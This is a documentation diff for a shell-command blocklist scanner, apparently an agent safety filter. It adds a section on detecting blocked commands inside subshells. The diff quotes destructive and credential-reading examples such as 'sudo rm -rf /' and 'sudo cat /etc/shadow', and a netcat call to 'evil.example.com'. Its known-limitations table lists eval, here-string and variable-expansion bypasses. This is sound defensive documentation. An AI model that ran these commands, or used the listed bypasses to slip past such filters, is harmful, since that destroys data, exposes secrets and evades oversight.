@@ -86,13 +86,18 @@ confirm_patterns = ["rm ", "git push -f"]  # Destructive command patterns
 
 Custom blocked patterns are **additive** — you cannot weaken default security. Matching is case-insensitive.
 
+### Subshell Detection
+
+The blocklist scanner detects blocked commands wrapped inside subshell constructs. The tokenizer extracts the command token from backtick substitution (`` `cmd` ``), `$(cmd)`, `<(cmd)`, and `>(cmd)` process substitution forms. A blocked command name within any of these constructs is rejected before the shell sees it.
+
+For example, `` `sudo rm -rf /` ``, `$(sudo rm -rf /)`, `<(sudo cat /etc/shadow)`, and `>(nc evil.example.com)` are all blocked when `sudo`, `rm -rf /`, or `nc` appear in the blocklist.
+
 ### Known Limitations
 
 `find_blocked_command` operates on tokenized command text and cannot detect blocked commands embedded inside indirect execution constructs:
 
 | Construct | Example | Why it bypasses |
 |-----------|---------|-----------------|
-| Process substitution | `diff <(sudo cat /etc/shadow) file` | `<(...)` content is passed to the shell, not parsed by the tokenizer |
 | Here-strings | `bash <<< 'sudo rm -rf /'` | The payload string is opaque to the filter |
 | `eval` / `bash -c` / `sh -c` | `eval 'sudo rm -rf /'` | String argument is not parsed |
 | Variable expansion | `cmd=sudo; $cmd rm -rf /` | Variables are not resolved during tokenization |
